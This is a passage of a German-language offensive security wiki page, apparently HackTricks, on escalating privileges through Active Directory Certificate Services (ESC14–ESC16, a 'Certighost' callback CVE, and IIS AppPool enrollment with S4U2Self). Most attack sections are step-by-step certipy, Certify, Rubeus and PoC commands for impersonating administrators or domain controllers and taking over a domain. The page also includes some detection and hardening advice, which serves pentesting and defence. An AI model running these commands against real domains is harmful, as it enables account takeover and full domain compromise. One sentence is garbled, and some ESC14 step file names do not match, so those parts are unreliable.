#### Szenario C: Das Ziel verfügt über eine X509IssuerSubject-Zuordnung

- **Voraussetzung**: Das Ziel verfügt in `altSecurityIdentities` über eine schwache explizite X509IssuerSubject-Zuordnung. Der Angreifer kann das Attribut `cn` oder `dNSHostName` eines Opfer-Principals so setzen, dass es dem Subject der X509IssuerSubject-Zuordnung des Ziels entspricht. Anschließend kann der Angreifer als Opfer ein Zertifikat beantragen und dieses Zertifikat verwenden, um sich als Ziel zu authentifizieren.
#### Szenario D: Das Ziel verfügt über eine X509SubjectOnly-Zuordnung

- **Voraussetzung**: Das Ziel verfügt in `altSecurityIdentities` über eine schwache explizite X509SubjectOnly-Zuordnung. Der Angreifer kann das Attribut `cn` oder `dNSHostName` eines Opfer-Principals so setzen, dass es dem Subject der X509SubjectOnly-Zuordnung des Ziels entspricht. Anschließend kann der Angreifer als Opfer ein Zertifikat beantragen und dieses Zertifikat verwenden, um sich als Ziel zu authentifizieren.
### Konkrete Schritte
#### Szenario A

Ein Zertifikat der Zertifikatvorlage `Machine` anfordern

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Das Zertifikat speichern und konvertieren

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Authentifizieren (mit dem Zertifikat)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Bereinigung (optional)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Für spezifischere Angriffsmethoden in verschiedenen Angriffsszenarien siehe: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Erklärung

Die [ursprüngliche ESC15-Forschung](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) erklärt, wie Application Policies in einer Anfrage für ein V1-Template die konfigurierte Extended Key Usage auf einer **ungepatchten ausstellenden CA** überschreiben können.<sup>[[15]](#references)</sup> Außerdem muss ein möglicher Kandidat über ein veröffentlichtes, für die Enrollment geeignetes Template verfügen, das die erforderlichen Eigenschaften für Subject und Anfrage zulässt und keine blockierende Genehmigungs- oder Signaturanforderung hat. Allein Enrollment-Rechte belegen nicht, dass die Ausnutzung möglich ist. Die Verwendung eines Certificate Request Agent kann zusätzlich von einem geeigneten zweiten Template und Einschränkungen für Enrollment Agents abhängen. Prüfe den Patch-Status der CA und das Ergebnis der Ausstellung, bevor du diesen Angriffspfad als möglich einstufst.

### Ausnutzung

Die [Dokumentation zur Rechteausweitung mit Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) enthält ausführlichere Anwendungsbeispiele.<sup>[[14]](#references)</sup>

Der Befehl `find` von Certipy kann dabei helfen, V1-Templates zu identifizieren, die potenziell für ESC15 anfällig sind, wenn die CA ungepatcht ist.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Szenario A: Direkte Impersonation über Schannel

**Schritt 1: Ein Zertifikat anfordern und dabei die Application Policy „Client Authentication“ sowie die UPN des Ziels injizieren.** Der Angreifer `attacker@corp.local` nimmt mit der Vorlage „WebServer“ V1 (die einen vom Antragsteller bereitgestellten Betreff zulässt) `administrator@corp.local` ins Visier.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Das anfällige V1-Template mit „Enrollee supplies subject“.
- `-application-policies 'Client Authentication'`: Fügt die OID `1.3.6.1.5.5.7.3.2` in die Application Policies-Erweiterung des CSR ein.
- `-upn 'administrator@corp.local'`: Setzt den UPN im SAN für die Impersonation.

**Schritt 2: Authentifiziere dich mit dem erhaltenen Zertifikat über Schannel (LDAPS).**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Szenario B: PKINIT/Kerberos-Impersonation durch Missbrauch eines Enrollment Agent

**Schritt 1: Ein Zertifikat von einem V1-Template anfordern (mit „Enrollee supplies subject“) und die Application Policy „Certificate Request Agent“ einschleusen.** Dieses Zertifikat ist für den Angreifer (`attacker@corp.local`) bestimmt, damit er als Enrollment Agent agieren kann. Für die eigene Identität des Angreifers wird hier kein UPN angegeben, da es darum geht, die Agent-Funktionalität zu erhalten.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Fügt die OID `1.3.6.1.4.1.311.20.2.1` hinzu.

**Schritt 2: Mit dem „agent“-Zertifikat im Namen eines privilegierten Zielbenutzers ein Zertifikat anfordern.** Dies ist ein ESC3-ähnlicher Schritt, bei dem das Zertifikat aus Schritt 1 als agent-Zertifikat verwendet wird.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Schritt 3: Authentifizieren Sie sich mit dem „on-behalf-of“-Zertifikat als privilegierter Benutzer.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Sicherheits-Erweiterung auf der CA deaktiviert (global)-ESC16

### Erklärung

**ESC16 (Rechteausweitung durch fehlende szOID_NTDS_CA_SECURITY_EXT-Erweiterung)** beschreibt die CA-weite Unterdrückung der SID-Erweiterung **szOID_NTDS_CA_SECURITY_EXT**. Dies ist ein Konfigurationsindikator und kein Beweis dafür, dass sich ein Zertifikat als ein anderes Konto authentifizieren kann. Für eine Identitätsübernahme sind außerdem die Kontrolle über die relevanten Kontoattribute oder das Mapping, eine für die Ausstellung geeignete Client-Authentifizierungsvorlage und ein Zertifikat-Mapping-Pfad erforderlich, der vom tatsächlichen Domänencontroller oder Dienst akzeptiert wird. Ein gepatchter KDC im Modus Full Enforcement lehnt Zertifikate ohne SID-Erweiterung ab, sofern sie nicht über ein anderes starkes Mapping verfügen; das nachfolgende UPN-only-Kerberos-Verfahren gilt für ältere KDCs oder KDCs im Kompatibilitätsmodus, die schwaches Mapping weiterhin akzeptieren. Siehe [Microsofts Anleitung zu Zertifikat-Mapping und Erzwingung](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Weitere Informationen zum detaillierten Prinzip finden Sie auch in diesem Artikel:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Missbrauch

Das folgende historische UPN-only-Kerberos-Beispiel basiert auf der [ESC16-Dokumentation von Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Es erfordert einen KDC, der das resultierende schwache Mapping weiterhin akzeptiert; `StrongCertificateBindingEnforcement=1` ist nach dem Windows-Sicherheitsupdate vom 9. September 2025 keine unterstützte Umgehungsmöglichkeit mehr.<sup>[[14]](#references)</sup>

Um festzustellen, ob die Active Directory Certificate Services (AD CS)-Umgebung für **ESC16** anfällig ist,】【。

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Schritt 1: Ursprünglichen UPN des Opferkontos auslesen (optional – zur Wiederherstellung).  
**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Schritt 2: Aktualisiere den UPN des Opferkontos auf den `sAMAccountName` des Zieladministrators.  **  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Schritt 3: (Falls nötig) Zugangsdaten für das „Opfer“-Konto beschaffen (z. B. über Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Schritt 4: Fordern Sie auf der mit ESC16 konfigurierten CA ein Zertifikat als „victim“-Benutzer von einer Client-Authentifizierungs-Vorlage an, für die das Konto Anmelderechte hat (z. B. „User“).** Die CA lässt die SID-Sicherheitserweiterung im ausgestellten Zertifikat weg, aber dadurch allein entsteht noch keine nutzbare Authentifizierungszuordnung. Setzen Sie die Umgebungsvariable für den Kerberos-Credential-Cache (Shell-Befehl):

```bash
export KRB5CCNAME=victim.ccache
```

Dann das Zertifikat anfordern:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Schritt 5: Setze den UPN des „Opfer“-Kontos zurück.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Schritt 6: Authentifizieren Sie sich auf einem älteren KDC oder einem KDC im Kompatibilitätsmodus, der diese schwache Zuordnung akzeptiert, als Zieladministrator.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Erklärung

**Certighost** missbraucht einen **AD-CS-enrollment-chase-/Callback-Pfad**, bei dem die CA den vom Anfragenden bereitgestellten Anforderungsattributen vertraut, um die Identität aufzulösen, die im ausgestellten Zertifikat eingetragen werden soll. Im öffentlichen PoC enthält die manipulierte Anfrage:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: vom Angreifer kontrollierter Host bzw. IP, den die CA kontaktieren wird
- **`rmd`**: der **DNS-Name des Ziel-Domain-Controllers**, der imitiert werden soll

Wenn die CA diesem chase folgt, verbindet sie sich über **SMB/LSA (`445`)** und **LDAP (`389`)** mit dem Angreifer. Der Angreifer verwendet ein **echtes Maschinenkonto** (üblicherweise erstellt über das standardmäßige **`ms-DS-MachineAccountQuota`**), damit sich die Callback-Sitzung als gültiger Domänenprinzipal authentifiziert. Die Rogue-Dienste liefern jedoch stattdessen die Identitätsattribute des **Ziel-DCs** zurück:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Wenn die CA die zurückgegebene Identität **nicht kryptografisch an den authentifizierten Callback-Prinzipal bindet**, kann sie ein Zertifikat für den **Domain Controller** ausstellen, obwohl sich die Sitzung mit dem vom Angreifer kontrollierten Maschinenkonto authentifiziert hat. Dadurch unterscheidet sich der Fehler konzeptionell von **Certifried**: Statt AD-Attribute wie `dNSHostName` umzuschreiben, **ersetzt der Angreifer Identitätsdaten während der Callback-Auflösung durch die CA**.<sup>[[2]](#references)</sup>

**Nützliche Voraussetzungen:**

- Zugangsdaten eines **Benutzers mit geringen Berechtigungen in der Domäne**
- Möglichkeit, ein Computerkonto **zu erstellen oder wiederzuverwenden**
- Netzwerkverbindung von der **CA** zu den vom Angreifer kontrollierten **Ports `389` und `445`**
- Verwundbarer / nicht gepatchter CA-Anforderungspfad (das Microsoft-Update vom **14. Juli 2026** ergänzte eine **DC-Validierung für `cdc`** sowie einen **Vergleich der aufgelösten SID**)

Die resultierende **`.pfx`** kann anschließend für **PKINIT** verwendet werden. Dadurch entstehen eine **`.ccache`** und, im veröffentlichten PoC-Ablauf, der **NT-Hash des Ziel-DCs**. Das reicht normalerweise für eine **vollständige Kompromittierung der Domäne**.

### Missbrauch

Der öffentliche PoC automatisiert die gesamte Kette:<sup>[[1]](#references)</sup>

1. Ein vom Angreifer kontrolliertes **Maschinenkonto** erstellen oder wiederverwenden.
2. **Rogue-LDAP- und SMB/LSA-Listener** auf `389` und `445` starten.
3. Eine Zertifikatsanforderung mit vom Angreifer kontrollierten **`cdc`**- und Ziel-**`rmd`**-Attributen übermitteln.
4. Die CA sich bei den Rogue-Listenern mit dem kontrollierten Maschinenkonto authentifizieren lassen, aber bei den Identitätsabfragen die Attribute des **Ziel-DCs** zurückgeben.
5. Ein von der CA signiertes **DC-Zertifikat** erhalten und anschließend für **PKINIT** verwenden.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Nützliche Laufzeit-Flags aus dem PoC:

- `--listener <ip>`: die in `cdc` angekündigte Callback-IP explizit auswählen
- `--computer-name <NAME$>`: ein vorhandenes Maschinenkonto wiederverwenden, statt ein neues zu erstellen

**Hinweise zur Durchführung:**

- Der PoC benötigt **root**, da er an **privilegierte Ports** `389` und `445` bindet.
- Bei erfolgreicher Ausnutzung werden lokal ein **DC-`.pfx`** und ein **Kerberos-`.ccache`** gespeichert.
- Da das Zertifikat einem **Domain-Controller-Konto** zugeordnet ist, können Folgeaktionen **zertifikatbasierte Kerberos-Authentifizierung**, **DCSync** und die Wiederverwendung des erlangten **Maschinen-NT-Hashes** umfassen.<sup>[[2]](#references)</sup>

## IIS-AppPool-Maschinenregistrierung bis zum Administrator auf demselben Host

Ein IIS-Pool, der als `ApplicationPoolIdentity` ausgeführt wird, verwendet für den ausgehenden Zugriff auf Netzwerkressourcen das **Computerkonto** seines Hosts. Daher bleibt code execution als `IIS AppPool\<POOL>` im lokalen Token zwar niedrig privilegiert, kann aber eine AD-CS-Anforderung einreichen, die von der CA als `HOST$` authentifiziert wird; dies ist ein Übergang der ausgehenden Identität und keine Token-Impersonation oder lokale Potato-artige Rechteausweitung.<sup>[[19]](#references)[[20]](#references)</sup>

Diese Angriffskette erfordert einen in die Domäne eingebundenen IIS-Host, eine über RPC erreichbare Enterprise-CA, ein veröffentlichtes Maschinenauthentifizierungstemplate, für das das Computerkonto Registrierungsrechte besitzt, PKINIT-Unterstützung sowie KDC-/SMB-Erreichbarkeit. Eine benutzerdefinierte Poolidentität ändert den ausgehenden Principal. Stelle daher sicher, dass der Pool tatsächlich `ApplicationPoolIdentity` verwendet, bevor du `HOST$` annimmst.<sup>[[19]](#references)[[20]](#references)</sup>

### Registrierung mit einem vom Angreifer kontrollierten Schlüssel

Erzeuge das Schlüsselpaar und die CSR außerhalb des IIS-Servers und bewahre den privaten Schlüssel auf. Übermittle vom kompromittierten Worker **nur die CSR**. Der [Certi-Bhai-ASPX-PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) instanziiert `CertificateAuthority.Request`, setzt `CertificateTemplate:Machine`, ruft `ICertRequest::Submit` auf und gibt das ausgestellte Zertifikat zurück. Verwende den CA-Konfigurationsstring `CAHOST\CA-NAME`; ein normales `Machine`-Template erstellt den Betreff anhand von AD, daher sind vom Anforderer bereitgestellte Betreff-/SAN-Daten nicht erforderlich.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Führe das zurückgegebene Zertifikat mit dem **passenden aufbewahrten Schlüssel** zusammen. `certutil -MergePFX machine_cert.cer machine_cert.pfx` funktioniert nur, wenn Windows das Zertifikat bereits einem zugänglichen privaten Schlüssel zuordnen kann. Erstelle bei separaten PEM-Dateien die PKCS#12-Datei explizit:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Verwende den PFX für PKINIT und behalte das zurückgegebene Computer-TGT als Base64, anstatt es sofort zu injizieren:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self plus dienstbezogener Austausch auf demselben Host

Mit S4U2Self kann ein Dienst ein Ticket **an sich selbst** anfordern, das die Autorisierungsdaten eines anderen Benutzers enthält. Mit dem Computer-TGT kann Rubeus dieses Ticket für einen privilegierten Benutzer anfordern, den Dienstnamen in der zurückgegebenen KRB-CRED in CIFS ändern und das Ticket injizieren. Dies ist die lokale Primitive „delegate to thyself“: Sie erfordert weder S4U2Proxy noch einen Eintrag in `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Das substituierte Ticket kann nur von Diensten auf demselben Computerkonto/-schlüssel verwendet werden (hier CIFS auf `HOST`). Es ist kein wiederverwendbares Administrator-Ticket für andere Domänencomputer. Außerdem zeigt das demonstrierte Ergebnis privilegierten SMB-/Dateisystemzugriff als Administrator; um einen lokalen `NT AUTHORITY\SYSTEM`-Prozess zu erhalten, ist weiterhin ein separater Remote-Execution-Schritt erforderlich.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Erkennung und Härtung

- Auf der CA sollten die Certification Services-Ereignisse **4886** (Anforderung empfangen) und **4887** (ausgestellt) auf unerwartete Anforderungen für die Vorlage `Machine` durch IIS-Serverkonten korreliert werden.<sup>[[19]](#references)[[24]](#references)</sup>
- Auf DCs enthält Ereignis **4768** Zertifikatsfelder, wenn die Zertifikat-Präauthentifizierung verwendet wird; ungewöhnliche PKINIT-TGT-Anforderungen für Webserverkonten sollten einen Alarm auslösen. Anschließend sollten **4769**-Anforderungen untersucht werden, die eine privilegierte impersonierte Identität und denselben Host betreffen. Da Rubeus `/altservice` den KRB-CRED-Dienstnamen clientseitig umschreibt, sollte nicht vorausgesetzt werden, dass der DC-seitige Dienstname in 4769 `cifs` lautet.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Es sollte nach `w3wp.exe` gesucht werden, das CA-RPC-Endpunkte aufruft, nach unerwarteter ASPX-Erstellung, Kerberos-authentifiziertem Zugriff auf administrative Freigaben und nach dem Dumpen von Secrets. Der Zugriff der App-Tier auf CA-RPC/KDC/SMB sollte nach Möglichkeit eingeschränkt werden; Computerregistrierungsrechte oder Machine-Authentication-Vorlagen, die nicht betrieblich erforderlich sind, sollten entfernt werden.<sup>[[19]](#references)</sup>

## Kompromittierung von Forests mit Zertifikaten im Passiv

### Aufbrechen von Forest-Trusts durch kompromittierte CAs

Die Konfiguration für die **forestübergreifende Registrierung** wird relativ einfach gestaltet. Das **Root-CA-Zertifikat** des Ressourcen-Forests wird von Administratoren in den **Account-Forests veröffentlicht**, und die **Enterprise-CA-Zertifikate** des Ressourcen-Forests werden den `NTAuthCertificates`- und AIA-Containern in jedem Account-Forest **hinzugefügt**. Zur Klarstellung: Diese Anordnung gewährt der **CA im Ressourcen-Forest die vollständige Kontrolle** über alle anderen Forests, für die sie die PKI verwaltet. Sollte diese CA von Angreifern **kompromittiert werden**, könnten Zertifikate für alle Benutzer in den Ressourcen- und Account-Forests von ihnen **gefälscht werden**, wodurch die Sicherheitsgrenze des Forests durchbrochen würde.<sup>[[6]](#references)</sup>

### Registrierungsrechte für fremde Principals

In Multi-Forest-Umgebungen ist bei Enterprise-CAs Vorsicht geboten, die **Zertifikatvorlagen veröffentlichen**, welche **Authenticated Users oder fremden Principals** (Benutzer/Gruppen außerhalb des Forests, zu dem die Enterprise-CA gehört) **Registrierungs- und Bearbeitungsrechte** gewähren.\
Bei der Authentifizierung über einen Trust wird die **Authenticated Users SID** von AD zum Token des Benutzers hinzugefügt. Wenn eine Domäne also über eine Enterprise-CA mit einer Vorlage verfügt, die **Authenticated Users Registrierungsrechte gewährt**, könnte sich möglicherweise ein Benutzer aus einem anderen Forest für diese Vorlage **registrieren**. Ebenso wird eine **forestübergreifende Zugriffskontrollbeziehung geschaffen**, wenn eine Vorlage einem fremden Principal ausdrücklich **Registrierungsrechte gewährt**. Dadurch kann sich ein Principal aus einem Forest für eine Vorlage aus einem anderen Forest **registrieren**.

Beide Szenarien führen zu einer **Vergrößerung der Angriffsfläche** zwischen Forests. Die Einstellungen der Zertifikatvorlage könnten von einem Angreifer ausgenutzt werden, um zusätzliche Berechtigungen in einer fremden Domäne zu erlangen.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC-Repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n – Technische Analyse von Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps-Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Missbrauch von Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound-GUI, neue Authentifizierungs- und Anforderungsmethoden und mehr](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Missbrauch von Key Trust Account Mapping zur Kontoübernahme](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Die Geschichte der Enhanced Key Usage (Fehl)Nutzung](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relay-Angriffe auf AD Certificate Services über RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell-Zugriff auf ADCS CA mit YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS-ESC13-Missbrauchstechnik](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS-ESC14-Missbrauchstechnik](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1–ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Nicht einfach ein weiterer AD-CS-ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Fehlkonfiguration und Ausnutzung](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – „Delegate 2 Thyself“ erneut betrachtet](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS-AD-CS-Registrierungs-PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Privilege Escalation vom IIS AppPool über den AD-CS-RPC-Endpunkt](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Anwendungspoolidentitäten](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12-Befehl](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Überwachung von Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Ereignis 4768: Ein Kerberos-Authentifizierungsticket wurde angefordert](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Ereignis 4769: Ein Kerberos-Dienstticket wurde angefordert](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD-CS-PowerShell-Exploitation-Toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
